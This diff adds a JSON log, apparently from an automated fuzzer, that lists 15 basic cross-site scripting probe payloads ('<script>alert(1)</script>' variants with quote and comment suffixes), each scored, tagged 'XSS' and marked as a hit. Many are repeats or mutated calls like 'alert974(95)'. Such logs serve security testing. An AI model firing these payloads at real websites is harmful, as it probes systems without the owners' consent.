@@ -1,0 +1,107 @@
+[
+  {
+    "payload": "<script>alert974(95)</script>'--",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.672687",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert974(95)</script>'--",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.674979",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>--%00",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.677256",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>''",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.679446",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.681614",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>''",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.683784",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert974(95)</script>'--",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.685985",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.688206",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.690626",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert157(10)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.693148",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>''",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.695499",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>''",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.697837",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert157(10)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.700069",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>'\"",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.706456",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>--'",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T14:50:24.708651",
+    "hit": true
+  }
+]
